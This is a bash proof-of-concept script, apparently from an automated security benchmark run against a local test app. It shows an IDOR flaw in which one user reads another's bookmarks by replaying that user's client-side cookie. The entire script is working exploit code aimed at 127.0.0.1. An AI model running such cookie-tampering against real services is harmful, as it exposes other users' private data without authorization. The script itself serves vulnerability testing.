#!/bin/bash
# POC: Demonstrates IDOR vulnerability allowing cross-user bookmark access by manipulating cookies
# Target: ./repo
# Created: 2025-11-07T19:38:44.394Z
# Session: benchmark-XBEN-075-24-mhp935fu

# IDOR POC: Cross-User Bookmark Access
# This POC demonstrates that an attacker can view other users' bookmarks
# by manipulating the 'bookmarks' cookie without proper authorization validation

TARGET_URL="http://127.0.0.1:5000"

echo "[*] IDOR POC: Cross-User Bookmark Access"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Create a bookmark as User A
echo "[Step 1] Creating bookmark as User A..."
RESPONSE=$(curl -s -c /tmp/cookies_a.txt -b "user=userA" \
  -d "name=User A Secret Bookmark&url=http://user-a-secrets.com" \
  "$TARGET_URL/add")
echo "[+] Bookmark created for User A"
echo ""

# Step 2: List bookmarks as User A (legitimate access)
echo "[Step 2] Listing bookmarks as User A (legitimate access)..."
RESPONSE_A=$(curl -s -b "user=userA; bookmarks=W3sibmFtZSI6IlVzZXIgQSBTZWNyZXQgQm9va21hcmsiLCJ1cmwiOiJodHRwOi8vdXNlci1hLXNlY3JldHMuY29tIn1d" \
  "$TARGET_URL/list")
if echo "$RESPONSE_A" | grep -q "User A Secret Bookmark"; then
  echo "[+] Successfully viewed User A's bookmarks as User A"
  echo "[+] Found bookmark: User A Secret Bookmark"
else
  echo "[-] Could not find User A's bookmarks"
fi
echo ""

# Step 3: Attempt to access User A's bookmarks as User B (IDOR exploit)
echo "[Step 3] Attempting IDOR exploit: accessing User A's bookmarks as User B..."
echo "[*] User B uses User A's bookmarks cookie (simulating IDOR attack)"

# Use User A's bookmarks cookie while authenticated as User B
RESPONSE_B=$(curl -s -b "user=userB; bookmarks=W3sibmFtZSI6IlVzZXIgQSBTZWNyZXQgQm9va21hcmsiLCJ1cmwiOiJodHRwOi8vdXNlci1hLXNlY3JldHMuY29tIn1d" \
  "$TARGET_URL/list")

if echo "$RESPONSE_B" | grep -q "User A Secret Bookmark"; then
  echo "[!] VULNERABILITY CONFIRMED!"
  echo "[!] User B successfully accessed User A's bookmarks without authorization"
  echo "[+] Extracted bookmark: User A Secret Bookmark"
  echo "[+] Extracted URL: http://user-a-secrets.com"
  echo ""
  echo "[!] This demonstrates IDOR - the application does not validate that"
  echo "[!] the bookmarks cookie belongs to the authenticated user (userB)"
  exit 0
else
  echo "[-] IDOR vulnerability not confirmed"
  echo "[-] Response received but bookmark not found"
  exit 1
fi